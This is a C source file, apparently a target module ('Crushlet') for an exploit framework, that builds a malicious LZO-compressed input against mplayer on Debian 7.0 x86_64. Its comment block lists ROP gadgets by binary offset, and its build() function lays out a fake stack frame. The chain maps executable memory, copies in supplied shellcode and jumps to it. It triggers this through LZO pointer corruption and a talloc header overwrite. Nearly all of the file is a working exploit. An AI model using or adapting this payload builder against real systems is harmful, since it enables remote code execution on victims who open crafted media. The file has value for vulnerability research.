/* Copyright (C) 2014 Lab Mouse Security
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*
###############################################
#
# gadget list
#

# stack pivot chain
#
_usr_bin_mplayer: asm=RET found at offset=253715 realistic_peer=8,4
LEAVE
JZ 0x43df18
ADD RSP, 0x20
POP RBX

# stack padding chain
#
# we need around 768 bytes so this should do it
_usr_bin_mplayer: asm=RET found at offset=316667 realistic_peer=13,5
ADD RSP, 0x2e8
POP RBX
POP RBP
POP R12
POP R13

# populate_mmap
#
_usr_bin_mplayer: asm=RET found at offset=229724 realistic_peer=1,1
POP RSI

_usr_bin_mplayer: asm=RET found at offset=212011 realistic_peer=1,1
POP RDX

_usr_bin_mplayer: asm=RET found at offset=200075 realistic_peer=1,1
POP RCX

_usr_bin_mplayer: asm=RET found at offset=168009 realistic_peer=1,1
POP RAX

_usr_bin_mplayer: asm=CALL RAX found at offset=305288 realistic_peer=7,3
POP R8
TEST RAX, RAX
JZ 0x44a8a8

_usr_bin_mplayer: asm=RET found at offset=168009 realistic_peer=1,1
POP RAX		# consume the ret addr

# call mmap_anon
#
# returns to first value on stack
# ret value in rax
   0x000000000055dbc3 <+3>:     mov    %r8,%r9
   0x000000000055dbc6 <+6>:     mov    $0xffffffff,%r8d
   0x000000000055dbcc <+12>:    or     $0x22,%ecx
   0x000000000055dbcf <+15>:    jmpq   0x42d270 <mmap64@plt>

# populate_memcpy Inspector Gadget OPTION THREE
#
_usr_bin_mplayer: asm=RET found at offset=304515 realistic_peer=11,7
PUSH RAX
POP RBX		# save a copy of rax in rbx
POP RBP
POP R12
POP R13
POP R14
POP R15

_usr_bin_mplayer: asm=RET found at offset=168009 realistic_peer=1,1
POP RAX         # populate next call addr

_usr_bin_mplayer: asm=CALL RAX found at offset=235607 realistic_peer=8,2
LEA RSI, [RSP+0x1c]
MOV RDI, RCX

_usr_bin_mplayer: asm=RET found at offset=304515 realistic_peer=6,3
POP R13		# skip past some dudes
POP R14
POP R15

_usr_bin_mplayer: asm=RET found at offset=308361 realistic_peer=9,5
MOV RAX, RBX
POP RBX
POP RBP
POP R12
POP R13

_usr_bin_mplayer: asm=JMP QWORD [RSI+0xf] found at offset=300837 realistic_peer=1,1
PUSH RAX

_usr_bin_mplayer: asm=RET found at offset=315254 realistic_peer=1,1
POP RDI

_usr_bin_mplayer: asm=RET found at offset=212011 realistic_peer=1,1
POP RDX

# call memcpy@plt
#
0x000000000042e220

# call shellcode
#
_usr_bin_mplayer: asm=RET found at offset=27204 realistic_peer=3,1
SUB RDI, R10	# still contains 0x22

_usr_bin_mplayer: asm=RET found at offset=27204 realistic_peer=3,1
SUB RDI, R10	# still contains 0x22

_usr_bin_mplayer: asm=RET found at offset=27204 realistic_peer=3,1
SUB RDI, R10	# still contains 0x22

_usr_bin_mplayer: asm=RET found at offset=27204 realistic_peer=3,1
SUB RDI, R10	# still contains 0x22

_usr_bin_mplayer: asm=RET 0xf66 found at offset=208292 realistic_peer=1,1
PUSH RDI		-- NOTE, RSP might need to be adjusted at the start of the shellcode
			-- this is OK because 
				1) we wont crash doing this
				2) RSP points to a different space than was mmap'd to RDI
#
###############################################
*/

#include <crush.h>

#define FRAME_BYTES (1024 + 256 + 256 + 256 + 256)

#define BASE_ADDR 0x400000ULL
#define GADGET_ADDR(o, a) ((BASE_ADDR) + (o) - (a))

#define OFFSET_TO_FRAME		0

#define FAKE_REGISTER 			0xa7a7a7a7a7a7a7a7ULL

#define STACK_PIVOT_CHAIN_G1 		GADGET_ADDR(253715, 8)

#define STACK_PADDING_G1		GADGET_ADDR(316667, 13)
#define STACK_PADDING_ADJUST		24 /* XXX size between talloc and start of frame */
#define STACK_PADDING_SIZE		(0x2e8 - STACK_PADDING_ADJUST)

#define POPULATE_MMAP_G1 		GADGET_ADDR(229724, 1)
#define POPULATE_MMAP_G2 		GADGET_ADDR(212011, 1)
#define POPULATE_MMAP_G3 		GADGET_ADDR(200075, 1)
#define POPULATE_MMAP_G4 		GADGET_ADDR(168009, 1)
#define POPULATE_MMAP_G5 		GADGET_ADDR(305288, 7)
#define POPULATE_MMAP_G6 		GADGET_ADDR(168009, 1)

#define MMAP_SIZE 8192
#define MMAP_PROT (PROT_READ|PROT_WRITE|PROT_EXEC)
#define MMAP_FLAGS (MAP_PRIVATE|MAP_ANONYMOUS)
#define MMAP_OFFSET 0

#define CALL_MMAP_ANON_G1 		0x000000000055dbc3ULL

#define POPULATE_MEMCPY_G1		GADGET_ADDR(304515, 11)
#define POPULATE_MEMCPY_G2		GADGET_ADDR(168009, 1)
#define POPULATE_MEMCPY_G3		GADGET_ADDR(235607, 8)
#define POPULATE_MEMCPY_G4		GADGET_ADDR(304515, 6)
#define POPULATE_MEMCPY_G5		GADGET_ADDR(308361, 9)
#define POPULATE_MEMCPY_G6		GADGET_ADDR(300837, 1)
#define POPULATE_MEMCPY_G7		GADGET_ADDR(315254, 1)
#define POPULATE_MEMCPY_G8		GADGET_ADDR(212011, 1)

#define MEMCPY_SHELLCODE_SIZE		(1008 + 100)

#define MEMCPY_AT_PLT			0x000000000042e220ULL

#define CALL_SHELLCODE_G1		GADGET_ADDR(27204, 3)
#define CALL_SHELLCODE_G2		GADGET_ADDR(27204, 3)
#define CALL_SHELLCODE_G3		GADGET_ADDR(27204, 3)
#define CALL_SHELLCODE_G4		GADGET_ADDR(27204, 3)
#define CALL_SHELLCODE_G5		GADGET_ADDR(208292, 1)

#define OFFSET_OF_SHELLCODE		-0x390

static Boolean
build(unsigned char const * input, int ninput, unsigned char ** output, int * noutput)
{
	register unsigned char * x, * y;
	unsigned char * buffer;
	unsigned long * addr;
	unsigned char * p;
	unsigned char * q;
	unsigned long * l;
	unsigned long * m;
	char w;
	int f;
	int n;

	if(ninput > NSIZE)
	{      
		error(False, "payload size exceeds maximum (%d > %d)", ninput, NSIZE);
		return False;
	}

	buffer = calloc(1024, (64 * 1024));
	if(!buffer)
	{
		perror("calloc");
		return False;
	}

	p = buffer;

	{
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 245;

		/* increment to the start of the embedded stack frame */
		q = p;
		q += OFFSET_TO_FRAME;

		/* implement the stack padding for RSP adjustment in STACK_PADDING_G1 */
		q += STACK_PADDING_SIZE;
		l = (unsigned long * )q;

		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = FAKE_REGISTER; /* r13 */
		*l++ = POPULATE_MMAP_G1;

		/* populate_mmap */
		*l++ = MMAP_SIZE;
		*l++ = POPULATE_MMAP_G2;
		*l++ = MMAP_PROT;
		*l++ = POPULATE_MMAP_G3;
		*l++ = MMAP_FLAGS;
		*l++ = POPULATE_MMAP_G4;
		*l++ = POPULATE_MMAP_G6;
		*l++ = POPULATE_MMAP_G5;
		*l++ = MMAP_OFFSET;
		*l++ = CALL_MMAP_ANON_G1;

		/* populate memcpy */
		*l++ = POPULATE_MEMCPY_G1;
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = FAKE_REGISTER; /* r13 */
		*l++ = FAKE_REGISTER; /* r14 */
		*l++ = FAKE_REGISTER; /* r15 */
		*l++ = POPULATE_MEMCPY_G2;
		*l++ = POPULATE_MEMCPY_G4;
		*l++ = POPULATE_MEMCPY_G3;
		*l++ = FAKE_REGISTER; /* r14 */
		*l++ = FAKE_REGISTER; /* r15 */
		*l++ = POPULATE_MEMCPY_G5;
		q = (unsigned char * )l;
		q += 4;	/* this is the base address of RSI now */
		q += 15; /* offset to jmp addr */
		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = FAKE_REGISTER; /* r13 */
		/* now populate the g7 call */
		m = (unsigned long * )q;
		*m = POPULATE_MEMCPY_G7;
		/* continue with the normal frame */
		*l++ = POPULATE_MEMCPY_G6;
		*l++ = POPULATE_MEMCPY_G8;
		*l++ = MEMCPY_SHELLCODE_SIZE;
		*l++ = MEMCPY_AT_PLT;

		*l++ = CALL_SHELLCODE_G1;
		*l++ = CALL_SHELLCODE_G2;
		*l++ = CALL_SHELLCODE_G3;
		*l++ = CALL_SHELLCODE_G4;
		*l++ = CALL_SHELLCODE_G5;

		n = (char * )l - (char * )p;

		msg(MsgVerbose, "total of %d bytes encoded to the fake frame", n);

		n = FRAME_BYTES - n;
		p = (unsigned char * )l;

		msg(MsgVerbose, "padding a total of %d bytes with NOP", n);

		/* the rest of the shellcode payload goes here */
		q = p;
		p += n;
		memcpy(q, input, ninput);

		/* jump backwards to the payload */
		/* 
			XXX
			Because this ROP is a huge pain in the ass we end up at the end of the
			shellcode. Only 908 bytes are copied out of our 1008 (?) 
		*/
		p -= 5;
		*p++ = 0xe8;
		*p++ = 0x10;
		*p++ = 0xfc;
		*p++ = 0xff;
		*p++ = 0xff;

		msg(MsgVerbose, "p is now at offset %ld", p - buffer);

		/* implement the LZO pointer corruption here */
		*p++ = 32;
		p += 16843000;
		*p++ = 136; /* always ensure the offset is -78 */

		/* now implement the copy to corrupt the talloc header */
		*p++ = 16;
		*p++ = 0;
		*p++ = 0;

		/* overwrite the header */
		*p++ = 62;
		p += 8;
		p += 8;
		p += 8;
		p += 8;
		p += 8;

		p -= 1; 
		l = (unsigned long * )p;
		*l++ = STACK_PIVOT_CHAIN_G1;
		*l++ = STACK_PADDING_G1; /* overwrite ->name */
		*l++ = 0;
		*l++ = TALLOC_MAGIC;
		*l++ = 0;
		p = (unsigned char * )l;
		p += 1;

		/* exit without error */
		*p++ = 17;
		*p++ = 0;
		*p++ = 0;
	}

	*noutput = p - buffer;
	*output = buffer;

	return True;
}

Crushlet
debian_7_0_0_x86_64 =
{
	"debian_7_0_0_x86_64",
	Platform_Linux,
	Architecture_x86,

	NULL,
	NULL,
	build
};

